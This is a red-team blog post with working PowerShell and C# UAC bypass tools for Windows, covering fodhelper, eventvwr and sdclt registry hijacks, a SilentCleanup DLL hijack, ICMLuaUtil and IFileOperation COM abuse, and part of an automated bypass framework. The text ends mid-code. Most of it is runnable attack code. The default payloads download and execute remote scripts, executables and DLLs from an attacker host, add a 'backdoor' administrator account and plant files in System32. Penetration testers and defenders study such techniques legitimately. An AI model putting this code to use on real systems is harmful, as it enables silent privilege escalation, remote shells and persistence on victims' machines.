---
title: "AppLocker Bypass — UAC Bypass"
date: 2026-03-06
description: "UAC bypass techniques in AppLocker-constrained environments — auto-elevating binaries, COM object hijacking, and token manipulation — with MITRE mapping and blue team detection."
tags: ["applocker", "bypass", "uac", "privilege-escalation", "evasion", "windows", "blueteam"]
---

> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1548.002](https://attack.mitre.org/techniques/T1548/002/) (Abuse Elevation Control Mechanism: Bypass User Account Control).

---

## Lab Setup

### Recommended VM Stack

``` {linenos=inline}
Host Machine
└── Hypervisor (VMware Workstation / VirtualBox / Hyper-V)
    ├── Windows 10/11 Enterprise (victim VM)
    │   ├── Local admin account (standard UAC config)
    │   ├── Windows Defender enabled + updated
    │   ├── UAC set to default ("Notify me only when apps try to make changes")
    │   ├── Sysmon (SwiftOnSecurity config)
    │   ├── Sysinternals Suite (Process Monitor, Process Hacker, AccessChk)
    │   └── PowerShell 5.1 + Script Block Logging enabled
    │
    └── Kali Linux (attacker VM)
        ├── mingw-w64 cross-compiler
        ├── Python 3.10+
        └── netcat / rlwrap listener
```

### Windows VM Configuration

**1. Create a standard admin test account**
```powershell
# Create local admin — this is your test persona
# UAC will fire for elevation requests from this account
net user testadmin P@ssw0rd123! /add
net localgroup Administrators testadmin /add
```

**2. Set UAC to default level (most common in the wild)**
```powershell
# Default: notify only when apps try to make changes, don't dim desktop
# Registry value 5 = default UAC behavior
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
    -Name "ConsentPromptBehaviorAdmin" -Value 5 -Type DWord

# Verify
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" |
    Select ConsentPromptBehaviorAdmin, EnableLUA, PromptOnSecureDesktop
```

**3. Enable Sysmon**
```powershell
.\Sysmon64.exe -accepteula -i sysmon-config.xml
```

**4. Verify your current integrity level**
```powershell
# should show "Medium Mandatory Level" on a standard admin session
whoami /groups | findstr "Mandatory"

# Medium = you can trigger UAC bypasses
# High   = you're already elevated, no bypass needed
```

**5. Verify integrity level tool — save this, use it constantly**
```powershell {linenos=inline}
# Check-Integrity.ps1 — shows current process integrity level
$sig = @"
using System;
using System.Runtime.InteropServices;
public class TokenInfo {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool GetTokenInformation(IntPtr token, int infoClass,
        IntPtr info, int infoLen, out int retLen);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
}
"@
Add-Type $sig

$token = [IntPtr]::Zero
[TokenInfo]::OpenProcessToken([TokenInfo]::GetCurrentProcess(), 0x8, [ref]$token) | Out-Null

$size = 0
[TokenInfo]::GetTokenInformation($token, 25, [IntPtr]::Zero, 0, [ref]$size) | Out-Null
$buf = [Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[TokenInfo]::GetTokenInformation($token, 25, $buf, $size, [ref]$size) | Out-Null

$rid = [Runtime.InteropServices.Marshal]::ReadInt32($buf, 8)
$labels = @{ 0x1000="Low"; 0x2000="Medium"; 0x3000="High"; 0x4000="System" }

Write-Host "[*] Process: $($pid)  ($([System.Diagnostics.Process]::GetCurrentProcess().ProcessName))"
Write-Host "[*] Integrity: $($labels[[int]$rid] ?? "Unknown (RID: 0x$($rid.ToString('X')))")"
[Runtime.InteropServices.Marshal]::FreeHGlobal($buf)
```

**6. Install Process Monitor for live registry/file tracing**
```
ProcMon → Filter → Process Name → is → fodhelper.exe → Add
         Filter → Category → is → Registry → Add
```
This is how the community discovers new UAC bypass paths — ProcMon on auto-elevated binaries watching for HKCU registry reads that don't exist yet.

**7. Snapshot before testing**
```
VM → Snapshot → "UAC_BASELINE_MEDIUM_INTEGRITY"
```
Revert between techniques: registry changes from one bypass can bleed into another test.

---

## How UAC Works

UAC enforces **integrity levels** on every process in Windows. Think of them as security rings that control what a process can touch:

```
SYSTEM integrity   ← kernel drivers, critical services
      │
HIGH integrity     ← elevated admin processes (after UAC prompt)
      │
MEDIUM integrity   ← standard user processes, normal admin sessions  ← you start here
      │
LOW integrity      ← sandboxed processes (IE Protected Mode, Edge)
      │
UNTRUSTED          ← extremely restricted
```

When you're logged in as an administrator, your shell runs at **Medium integrity** by default. UAC acts as a gate: to reach High integrity, a UAC consent prompt must be approved.

**Auto-elevation** is the gap we exploit. Some Microsoft-signed binaries carry an application manifest declaring `autoElevate="true"`. Windows trusts these binaries to silently elevate to High integrity without a UAC prompt. The assumption: Microsoft wrote them, they're safe.

```xml
<!-- manifest snippet from fodhelper.exe -->
<requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
<autoElevate>true</autoElevate>
```

If we can hijack what an auto-elevated binary does, via registry redirection, DLL hijacking, or COM object substitution, we execute arbitrary code at High integrity with zero UAC prompts.

---

## Phase 1 — Enumeration

### Tool 1 — Find-AutoElevatedBinaries.ps1

```powershell {linenos=inline}
# Find-AutoElevatedBinaries.ps1
# Scans Windows binaries for autoElevate=true in their manifests.
# These are your primary bypass candidates.

param(
    [string[]]$ScanDirs = @(
        "$env:WINDIR\System32",
        "$env:WINDIR\SysWOW64"
    ),
    [switch]$Detailed
)

Add-Type -AssemblyName System.Xml.Linq

function Get-Manifest([string]$exePath) {
    try {
        # use MT.exe if available, otherwise parse PE directly
        $bytes = [IO.File]::ReadAllBytes($exePath)

        # scan for the RT_MANIFEST resource signature
        # simplified: search for XML declaration in PE bytes
        $xmlSig = [Text.Encoding]::ASCII.GetBytes('<?xml')
        for ($i = 0; $i -lt $bytes.Length - $xmlSig.Length; $i++) {
            $match = $true
            for ($j = 0; $j -lt $xmlSig.Length; $j++) {
                if ($bytes[$i+$j] -ne $xmlSig[$j]) { $match = $false; break }
            }
            if ($match) {
                # extract manifest XML
                $end = $i
                while ($end -lt $bytes.Length -and $bytes[$end] -ne 0) { $end++ }
                return [Text.Encoding]::UTF8.GetString($bytes[$i..($end-1)])
            }
        }
    } catch {}
    return $null
}

$results = [Collections.Generic.List[PSCustomObject]]::new()

foreach ($dir in $ScanDirs | Where-Object { Test-Path $_ }) {
    Write-Host "[*] scanning $dir ..." -ForegroundColor Cyan

    Get-ChildItem -Path $dir -Filter "*.exe" -ErrorAction SilentlyContinue |
    ForEach-Object {
        $manifest = Get-Manifest $_.FullName
        if ($manifest -and $manifest -match 'autoElevate.*true') {
            $level = if ($manifest -match 'requireAdministrator') { 'requireAdmin' }
                     elseif ($manifest -match 'highestAvailable') { 'highest' }
                     else { 'unknown' }
            $results.Add([PSCustomObject]@{
                Name      = $_.Name
                Path      = $_.FullName
                Level     = $level
                Signed    = (Get-AuthenticodeSignature $_.FullName).Status -eq 'Valid'
                Size      = $_.Length
            })
        }
    }
}

Write-Host "`n[+] Auto-elevated binaries found: $($results.Count)`n" -ForegroundColor Green
$results | Sort-Object Name | Format-Table Name, Level, Signed, Path -AutoSize

$results | Export-Csv ".\auto_elevated.csv" -NoTypeInformation
Write-Host "[*] saved → auto_elevated.csv"
```

### Tool 2 — Find-UACRegistryGaps.ps1

For each auto-elevated binary, ProcMon shows which HKCU registry keys it reads that don't exist. This script cross-references a known list and checks which gaps are present on this machine — each writable missing key is a bypass opportunity.

```powershell {linenos=inline}
# Find-UACRegistryGaps.ps1
# Checks known UAC bypass registry paths — reports which are exploitable here.

$BypassPaths = @(
    [PSCustomObject]@{
        Binary  = "fodhelper.exe"
        HKCUKey = "Software\Classes\ms-settings\Shell\Open\command"
        ValueName = "(Default) + DelegateExecute"
        Technique = "Registry Hijack"
        Risk    = "High"
    },
    [PSCustomObject]@{
        Binary  = "eventvwr.exe"
        HKCUKey = "Software\Classes\mscfile\shell\open\command"
        ValueName = "(Default)"
        Technique = "Registry Hijack"
        Risk    = "High"
    },
    [PSCustomObject]@{
        Binary  = "sdclt.exe"
        HKCUKey = "Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
        ValueName = "(Default)"
        Technique = "Registry Hijack"
        Risk    = "High"
    },
    [PSCustomObject]@{
        Binary  = "cmstp.exe"
        HKCUKey = "Software\Classes\mscfile\shell\open\command"
        ValueName = "(Default)"
        Technique = "INF file"
        Risk    = "Medium"
    },
    [PSCustomObject]@{
        Binary  = "SilentCleanup (schtask)"
        HKCUKey = "N/A — PATH DLL hijack"
        ValueName = "N/A"
        Technique = "DLL Hijack via PATH"
        Risk    = "High"
    },
    [PSCustomObject]@{
        Binary  = "CompMgmtLauncher.exe"
        HKCUKey = "Software\Classes\mscfile\shell\open\command"
        ValueName = "(Default)"
        Technique = "Registry Hijack"
        Risk    = "Medium"
    }
)

Write-Host "`n[*] Checking UAC bypass registry gaps on this system...`n" -ForegroundColor Cyan

foreach ($entry in $BypassPaths) {
    if ($entry.HKCUKey -eq 'N/A — PATH DLL hijack') {
        Write-Host "  [TASK]   $($entry.Binary) — $($entry.Technique)" -ForegroundColor Yellow
        continue
    }

    $fullPath = "HKCU:\$($entry.HKCUKey)"
    $exists   = Test-Path $fullPath
    $status   = if (-not $exists) { "[MISSING — EXPLOITABLE]" } else { "[EXISTS — check value]" }
    $color    = if (-not $exists) { "Green" } else { "Gray" }

    Write-Host "  $status $($entry.Binary) → $($entry.HKCUKey)" -ForegroundColor $color
    if ($Detailed -and $exists) {
        Get-ItemProperty -Path $fullPath -ErrorAction SilentlyContinue |
            Out-String | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
    }
}
```

---

## Bypass 1 — fodhelper.exe (Registry Hijack)

`fodhelper.exe` (Features On Demand Helper) is an auto-elevated binary that manages optional Windows features. During execution it reads `HKCU\Software\Classes\ms-settings\Shell\Open\command` to find a handler. HKCU is always writable by the current user — no admin needed to set keys there.

Write your payload command to that key, launch fodhelper, and Windows runs your command at High integrity without a UAC prompt.

### PowerShell implementation

```powershell {linenos=inline}
# Invoke-FodhelperBypass.ps1
# Spawns an elevated process via fodhelper.exe HKCU registry hijack.
# Requires: Medium integrity admin account (default UAC config)

param(
    [string]$Command   = "powershell -nop -w hidden -ep bypass -c `"IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')`"",
    [switch]$Cleanup,
    [switch]$Verify
)

$regPath     = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
$fodhelper   = "$env:WINDIR\System32\fodhelper.exe"

function Invoke-Bypass {
    Write-Host "[*] planting registry keys..." -ForegroundColor Cyan

    # create key hierarchy
    New-Item -Path $regPath -Force | Out-Null

    # (Default) value = command to execute
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Command

    # DelegateExecute MUST be present (can be empty) — signals to fodhelper
    # that the value is a command, not a file handler
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null

    Write-Host "[+] HKCU keys planted:" -ForegroundColor Green
    Write-Host "    $regPath"
    Write-Host "    (Default)       = $Command"
    Write-Host "    DelegateExecute = (empty)"

    # brief pause — let registry writes flush
    Start-Sleep -Milliseconds 200

    Write-Host "[*] launching fodhelper.exe..." -ForegroundColor Cyan
    Start-Process $fodhelper -WindowStyle Hidden

    # give it time to trigger before cleanup
    Start-Sleep -Seconds 3
}

function Invoke-Cleanup {
    $parent = "HKCU:\Software\Classes\ms-settings"
    if (Test-Path $parent) {
        Remove-Item -Path $parent -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[+] registry keys removed" -ForegroundColor Green
    }
}

function Test-Bypass {
    # write a marker file at High integrity path — only writable from High
    $marker = "C:\Windows\System32\uac_test_$(Get-Random).txt"
    $testCmd = "cmd /c echo elevated > $marker"

    Invoke-FodhelperBypass -Command $testCmd
    Start-Sleep -Seconds 4

    if (Test-Path $marker) {
        Write-Host "[+] BYPASS CONFIRMED — marker written to System32" -ForegroundColor Green
        Remove-Item $marker -Force
    } else {
        Write-Host "[-] bypass failed or AV blocked execution" -ForegroundColor Red
    }
}

if ($Verify)  { Test-Bypass;   return }
if ($Cleanup) { Invoke-Cleanup; return }

Invoke-Bypass
Start-Sleep -Seconds 2
Invoke-Cleanup   # always clean up registry artifacts
```

### One-liner (for constrained environments)

```powershell
$p="HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item $p -Force|Out-Null
Set-ItemProperty $p "(Default)" "cmd /c start powershell -nop -w hidden -ep bypass"
New-ItemProperty $p "DelegateExecute" -Value "" -Force|Out-Null
Start-Process "$env:WINDIR\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

---

## Bypass 2 — eventvwr.exe (Registry Hijack)

`eventvwr.exe` (Event Viewer) auto-elevates and reads `HKCU\Software\Classes\mscfile\shell\open\command` to find the handler for `.msc` files. Same pattern — write command, trigger binary, code runs at High integrity.

```powershell {linenos=inline}
# Invoke-EventvwrBypass.ps1

param(
    [string]$Command = "powershell -nop -w hidden -ep bypass -c `"IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')`"",
    [switch]$Cleanup
)

$regPath   = "HKCU:\Software\Classes\mscfile\shell\open\command"
$eventvwr  = "$env:WINDIR\System32\eventvwr.exe"

function Set-Bypass {
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Command

    Write-Host "[+] planted: $regPath" -ForegroundColor Green
    Write-Host "    command: $Command"

    Start-Sleep -Milliseconds 200
    Start-Process $eventvwr -WindowStyle Hidden
    Write-Host "[*] eventvwr.exe launched — waiting for trigger..."
    Start-Sleep -Seconds 3
}

function Remove-Keys {
    Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] cleaned up" -ForegroundColor Green
}

if ($Cleanup) { Remove-Keys; return }
Set-Bypass
Remove-Keys
```

---

## Bypass 3 — sdclt.exe (App Path Hijack)

`sdclt.exe` (Backup and Restore) queries `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe` to locate the Control Panel binary. Redirect it to your payload — sdclt auto-elevates and executes it at High integrity.

```powershell {linenos=inline}
# Invoke-SdcltBypass.ps1

param(
    [string]$Payload = "C:\Windows\Tasks\payload.exe",
    [string]$PayloadUrl = "http://10.10.10.10/payload.exe",
    [switch]$Cleanup
)

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
$sdclt   = "$env:WINDIR\System32\sdclt.exe"

function Set-Bypass {
    # drop payload to trusted writable path first (combines with trusted folder bypass)
    if ($PayloadUrl -and -not (Test-Path $Payload)) {
        (New-Object Net.WebClient).DownloadFile($PayloadUrl, $Payload)
        Write-Host "[+] payload staged: $Payload" -ForegroundColor Green
    }

    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Payload

    Write-Host "[+] App Path hijacked:" -ForegroundColor Green
    Write-Host "    $regPath → $Payload"

    Start-Sleep -Milliseconds 200

    # /kickoffelev flag triggers the App Path lookup
    Start-Process $sdclt -ArgumentList "/kickoffelev" -WindowStyle Hidden
    Write-Host "[*] sdclt.exe /kickoffelev launched"
    Start-Sleep -Seconds 3
}

function Remove-Keys {
    if (Test-Path $regPath) {
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" `
            -Force -ErrorAction SilentlyContinue
        Write-Host "[+] registry cleaned" -ForegroundColor Green
    }
}

if ($Cleanup) { Remove-Keys; return }
Set-Bypass
Remove-Keys
```

---

## Bypass 4 — SilentCleanup Scheduled Task (DLL Hijack)

The `SilentCleanup` scheduled task runs `DismHost.exe` and `cleanmgr.exe` at High integrity without a UAC prompt. It's designed to run silently during maintenance windows. The task inherits the current user's `%PATH%` environment variable. Drop a malicious DLL with the right name into a user-writable directory that appears in PATH before System32, and DiskCleanup loads it at High integrity.

```powershell {linenos=inline}
# Invoke-SilentCleanupBypass.ps1
# DLL hijack via SilentCleanup scheduled task PATH manipulation

param(
    [string]$DllUrl     = "http://10.10.10.10/dismcore.dll",
    [string]$DllDrop    = "$env:TEMP\dismcore.dll",   # user-writable, often in PATH
    [switch]$PrependPath,
    [switch]$Cleanup
)

# Target DLL: dismcore.dll — loaded by DismHost.exe, often missing from user PATH dirs
$targetDll  = "dismcore.dll"
$taskName   = "SilentCleanup"

function Set-Bypass {
    # fetch malicious DLL
    (New-Object Net.WebClient).DownloadFile($DllUrl, $DllDrop)
    Write-Host "[+] DLL staged: $DllDrop" -ForegroundColor Green

    if ($PrependPath) {
        # prepend drop directory to user PATH — ensures our DLL found before System32
        $dropDir    = Split-Path $DllDrop
        $currentPath = [Environment]::GetEnvironmentVariable("PATH", "User")
        if ($currentPath -notlike "$dropDir*") {
            [Environment]::SetEnvironmentVariable("PATH", "$dropDir;$currentPath", "User")
            $env:PATH = "$dropDir;$env:PATH"
            Write-Host "[+] PATH prepended: $dropDir" -ForegroundColor Green
        }
    }

    Write-Host "[*] triggering SilentCleanup task..." -ForegroundColor Cyan
    Start-ScheduledTask -TaskName $taskName
    Write-Host "[+] task triggered — DismHost.exe will load $targetDll from PATH"
    Write-Host "[*] shell should arrive within 10-15 seconds"
}

function Remove-Bypass {
    if (Test-Path $DllDrop) {
        Remove-Item $DllDrop -Force
        Write-Host "[+] DLL removed: $DllDrop"
    }
    if ($PrependPath) {
        $dropDir  = Split-Path $DllDrop
        $p = [Environment]::GetEnvironmentVariable("PATH", "User")
        [Environment]::SetEnvironmentVariable("PATH", ($p -replace [Regex]::Escape("$dropDir;"),""), "User")
        Write-Host "[+] PATH restored"
    }
}

if ($Cleanup) { Remove-Bypass; return }
Set-Bypass
```

**Build the DLL payload (use `hijack_base.c` from the DLL Hijacking blog with LHOST/LPORT updated):**

```bash
# compile dismcore.dll — matches name DismHost.exe looks for
x86_64-w64-mingw32-gcc -shared -o dismcore.dll hijack_base.c \
    -lws2_32 -mwindows -s -fno-ident -Wl,--build-id=none
```

---

## Bypass 5 — COM Object Hijacking (ICMLuaUtil)

Several auto-elevated binaries instantiate COM objects. COM object resolution checks HKCU before HKLM, meaning a user-registered COM object shadows the system one without admin rights. Register a malicious COM server in HKCU, trigger the elevated binary that uses it, and your server runs in its High-integrity context.

`ICMLuaUtil` is an interface exposed by `cmluautil.dll` that several auto-elevated binaries use. We can directly invoke it via late-binding to execute arbitrary commands at High integrity.

### C# COM elevation via ICMLuaUtil

```csharp {linenos=inline}
// CMLuaBypass.cs
// Calls ICMLuaUtil::ShellExec to run an arbitrary command at High integrity.
// ICMLuaUtil is exposed by an auto-elevated COM server — no UAC prompt fires.
//
// Compile: csc.exe /out:CMLuaBypass.exe CMLuaBypass.cs
//      or: dotnet build

using System;
using System.Runtime.InteropServices;

[ComImport]
[Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface ICMLuaUtil {
    void SetRasCredentials();
    void SetRasEntryProperties();
    void DeleteRasEntry();
    void LaunchInfSection();
    void LaunchInfSectionEx();
    void CreateLayerDirectory();
    void ShellExec(
        string file,
        string parameters,
        string directory,
        uint fMask,
        uint nShow
    );
    void SetRegistryStringValue();
    void DeleteRegistryStringValue();
    void DeleteRegKeysAndValues();
    void CreateDirectoryWithElevatedPriviliges();
}

[ComImport]
[Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7")]
[ClassInterface(ClassInterfaceType.None)]
class CMLuaUtil { }

class Program {
    static void Main(string[] args) {
        string cmd    = args.Length > 0 ? args[0] : "powershell.exe";
        string param  = args.Length > 1 ? args[1] : "-nop -w hidden -ep bypass -c whoami";
        string cwd    = args.Length > 2 ? args[2] : @"C:\Windows\System32";

        Console.WriteLine($"[*] target : {cmd} {param}");
        Console.WriteLine("[*] invoking ICMLuaUtil::ShellExec via auto-elevated COM...");

        try {
            var util = (ICMLuaUtil)new CMLuaUtil();
            util.ShellExec(cmd, param, cwd, 0x00000000, 1);
            Console.WriteLine("[+] ShellExec called — command should run at High integrity");
        } catch (Exception ex) {
            Console.Error.WriteLine($"[-] failed: {ex.Message}");
            Console.Error.WriteLine("    (ensure you are Medium integrity + local admin)");
        }
    }
}
```

```cmd {linenos=inline}
:: compile and run
csc.exe /out:CMLuaBypass.exe CMLuaBypass.cs

:: execute arbitrary command at high integrity — no UAC prompt
CMLuaBypass.exe powershell.exe "-nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')"

:: add local user to admins (for persistence)
CMLuaBypass.exe cmd.exe "/c net localgroup Administrators backdoor /add"

:: copy file to protected path
CMLuaBypass.exe cmd.exe "/c copy C:\Users\Public\payload.exe C:\Windows\System32\evil.exe"
```

---

## Bypass 6 — IFileOperation COM (Privileged File Copy)

The `IFileOperation` COM interface runs at the caller's integrity level, but when invoked from within an auto-elevated process context, it inherits High integrity. This lets you copy files to privileged locations (like `C:\Windows\System32\`) without a UAC prompt.

Classic use: copy a malicious DLL to System32, then trigger a binary that loads it.

```csharp {linenos=inline}
// FileOpBypass.cs
// Uses IFileOperation at High integrity (via auto-elevated COM host) to
// copy files to privileged locations — combines with DLL hijacking for RCE.
//
// Compile: csc.exe /target:library /out:FileOpBypass.dll FileOpBypass.cs
//
// Then load via Assembly.Load() from an elevated context.

using System;
using System.Runtime.InteropServices;

[ComImport]
[Guid("947aab5f-0a5c-4c13-b4d6-4bf7836fc9f8")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IFileOperation {
    void Advise(IFileOperationProgressSink pfops, out uint pdwCookie);
    void Unadvise(uint dwCookie);
    void SetOperationFlags(uint dwOperationFlags);
    void SetProgressMessage([MarshalAs(UnmanagedType.LPWStr)] string pszMessage);
    void SetProgressDialog([MarshalAs(UnmanagedType.IUnknown)] object popd);
    void GetAnyOperationsAborted(out bool pfAnyOperationsAborted);
    void MoveItem(
        [MarshalAs(UnmanagedType.IUnknown)] object psiItem,
        [MarshalAs(UnmanagedType.IUnknown)] object psiDestinationFolder,
        [MarshalAs(UnmanagedType.LPWStr)] string pszNewName,
        [MarshalAs(UnmanagedType.IUnknown)] object pfopsItem);
    void MoveItems(
        [MarshalAs(UnmanagedType.IUnknown)] object punkItems,
        [MarshalAs(UnmanagedType.IUnknown)] object psiDestinationFolder);
    void CopyItem(
        [MarshalAs(UnmanagedType.IUnknown)] object psiItem,
        [MarshalAs(UnmanagedType.IUnknown)] object psiDestinationFolder,
        [MarshalAs(UnmanagedType.LPWStr)] string pszCopyName,
        [MarshalAs(UnmanagedType.IUnknown)] object pfopsItem);
    void CopyItems(
        [MarshalAs(UnmanagedType.IUnknown)] object punkItems,
        [MarshalAs(UnmanagedType.IUnknown)] object psiDestinationFolder);
    void DeleteItem(
        [MarshalAs(UnmanagedType.IUnknown)] object psiItem,
        [MarshalAs(UnmanagedType.IUnknown)] object pfopsItem);
    void DeleteItems([MarshalAs(UnmanagedType.IUnknown)] object punkItems);
    void RenameItem(
        [MarshalAs(UnmanagedType.IUnknown)] object psiItem,
        [MarshalAs(UnmanagedType.LPWStr)] string pszNewName,
        [MarshalAs(UnmanagedType.IUnknown)] object pfopsItem);
    void RenameItems(
        [MarshalAs(UnmanagedType.IUnknown)] object punkItems,
        [MarshalAs(UnmanagedType.LPWStr)] string pszNewName);
    void ApplyPropertiesToItem(
        [MarshalAs(UnmanagedType.IUnknown)] object psiItem,
        [MarshalAs(UnmanagedType.IUnknown)] object pproparray);
    void ApplyPropertiesToItems(
        [MarshalAs(UnmanagedType.IUnknown)] object punkItems,
        [MarshalAs(UnmanagedType.IUnknown)] object pproparray);
    void NewItem(
        [MarshalAs(UnmanagedType.IUnknown)] object psiDestinationFolder,
        uint dwFileAttributes,
        [MarshalAs(UnmanagedType.LPWStr)] string pszName,
        [MarshalAs(UnmanagedType.LPWStr)] string pszTemplateName,
        [MarshalAs(UnmanagedType.IUnknown)] object pfopsItem);
    void PerformOperations();
}

[ComImport]
[Guid("00000114-0000-0000-C000-000000000046")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IFileOperationProgressSink { }

[ComImport]
[Guid("3ad05575-8857-4850-9277-11b85bdb8e09")]
[ClassInterface(ClassInterfaceType.None)]
class FileOperation { }

public static class FileOpBypass {

    [DllImport("shell32.dll", CharSet=CharSet.Unicode)]
    static extern int SHCreateItemFromParsingName(
        string pszPath, IntPtr pbc,
        [MarshalAs(UnmanagedType.LPStruct)] Guid riid,
        [MarshalAs(UnmanagedType.IUnknown)] out object ppv);

    static readonly Guid IShellItemGuid = new Guid("43826d1e-e718-42ee-bc55-a1e261c37bfe");

    static object GetShellItem(string path) {
        object item;
        SHCreateItemFromParsingName(path, IntPtr.Zero, IShellItemGuid, out item);
        return item;
    }

    // Copy srcFile → dstDir\newName using High-integrity IFileOperation
    public static void CopyToPrivileged(string srcFile, string dstDir, string newName = null) {
        var op = (IFileOperation)new FileOperation();

        // FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI
        op.SetOperationFlags(0x0614);

        var src  = GetShellItem(srcFile);
        var dst  = GetShellItem(dstDir);
        var name = newName ?? System.IO.Path.GetFileName(srcFile);

        op.CopyItem(src, dst, name, null);
        op.PerformOperations();

        Console.WriteLine($"[+] copied {srcFile} → {dstDir}\\{name}");
    }

    // Example: plant malicious DLL into System32 for subsequent hijack
    public static void PlantDLL(string maliciousDll, string targetDllName) {
        CopyToPrivileged(maliciousDll, @"C:\Windows\System32", targetDllName);
        Console.WriteLine($"[+] {targetDllName} planted in System32 — trigger target binary to get High-integrity shell");
    }
}
```

---

## Bypass 7 — Automated UAC Bypass Framework (C#)

A unified C# framework that enumerates available bypasses and executes the most appropriate one for the current system, with fallback logic.

```csharp {linenos=inline}
// UACBypass.cs — automated UAC bypass framework
// Tries bypasses in order of stealth/reliability, falls back on failure.
//
// Compile: csc.exe /out:UACBypass.exe UACBypass.cs
//
// Usage:
//   UACBypass.exe                                    — auto-select + execute
//   UACBypass.exe --cmd "powershell -nop -w hidden"  — custom command
//   UACBypass.exe --list                             — list available bypasses
//   UACBypass.exe --method fodhelper                 — force specific bypass

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

class UACBypass {

    // ── Win32 helpers ─────────────────────────────────────────────────────
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool GetTokenInformation(IntPtr token, int infoClass,
        IntPtr info, int infoLen, out int retLen);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();

    // ── integrity level detection ─────────────────────────────────────────
    static int GetIntegrityLevel() {
        IntPtr token;
        OpenProcessToken(GetCurrentProcess(), 0x8, out token);
        int size = 0;
        GetTokenInformation(token, 25, IntPtr.Zero, 0, out size);
        var buf = Marshal.AllocHGlobal(size);
        GetTokenInformation(token, 25, buf, size, out size);
        int rid = Marshal.ReadInt32(buf, 8);
        Marshal.FreeHGlobal(buf);
        return rid;
    }

    const int HIGH_INTEGRITY   = 0x3000;
    const int MEDIUM_INTEGRITY = 0x2000;

    // ── bypass registry helper ────────────────────────────────────────────
    static void SetRegValue(string hkcu, string valueName, string data) {
        using var key = Registry.CurrentUser.CreateSubKey(hkcu, true);
        key.SetValue(valueName, data);
        if (valueName == "(Default)" || valueName == "") {
            // also set DelegateExecute if this is a shell\open\command key
            if (hkcu.EndsWith("command", StringComparison.OrdinalIgnoreCase))
                key.SetValue("DelegateExecute", "");
        }
    }

    static void DeleteRegKey(string hkcu) {
        try { Registry.CurrentUser.DeleteSubKeyTree(hkcu, false); } catch {}
    }

    static bool WaitForElevation(string markerPath, int timeoutMs = 6000) {
        int elapsed = 0;
        while (elapsed < timeoutMs) {
            if (File.Exists(markerPath)) { File.Delete(markerPath); return true; }
            Thread.Sleep(300);
            elapsed += 300;
        }
        return false;
    }

    // ── bypass implementations ────────────────────────────────────────────

    static bool BypassFodhelper(string cmd) {
        const string regKey = @"Software\Classes\ms-settings\Shell\Open\command";
        try {
            SetRegValue(regKey, "", cmd);
            Thread.Sleep(200);
            Process.Start(new ProcessStartInfo {
                FileName        = Path.Combine(Environment.GetEnvironmentVariable("WINDIR"),
                                               "System32", "fodhelper.exe"),
                WindowStyle     = ProcessWindowStyle.Hidden,
                UseShellExecute = false
            });
            Thread.Sleep(3000);
            return true;
        } finally {
            DeleteRegKey(@"Software\Classes\ms-settings");
        }
    }

    static bool BypassEventvwr(string cmd) {
        const string regKey = @"Software\Classes\mscfile\shell\open\command";
        try {
            SetRegValue(regKey, "", cmd);
            Thread.Sleep(200);
            Process.Start(new ProcessStartInfo {
                FileName        = Path.Combine(Environment.GetEnvironmentVariable("WINDIR"),
                                               "System32", "eventvwr.exe"),
                WindowStyle     = ProcessWindowStyle.Hidden,
                UseShellExecute = false
            });
            Thread.Sleep(3000);
            return true;
        } finally {
            DeleteRegKey(@"Software\Classes\mscfile");
        }
    }

    static bool BypassSdclt(string payload) {
        const string regKey = @"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe";
        try {
            SetRegValue(regKey, "", payload);
            Thread.Sleep(200);
            Process.Start(new ProcessStartInfo {
                FileName        = Path.Combine(Environment.GetEnvironmentVariable("WINDIR"),
                                               "System32", "sdclt.exe"),
                Arguments       = "/kickoffelev",
                WindowStyle     = ProcessWindowStyle.Hidden,
                UseShellExecute = false
            });
            Thread.Sleep(3000);
            return true;
        } finally {
            DeleteRegKey(@"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe");
        }
    }

    // ── bypass catalogue ──────────────────────────────────────────────────
    class BypassEntry {
        public string   Name;
        public string   Binary;
        public string   Notes;
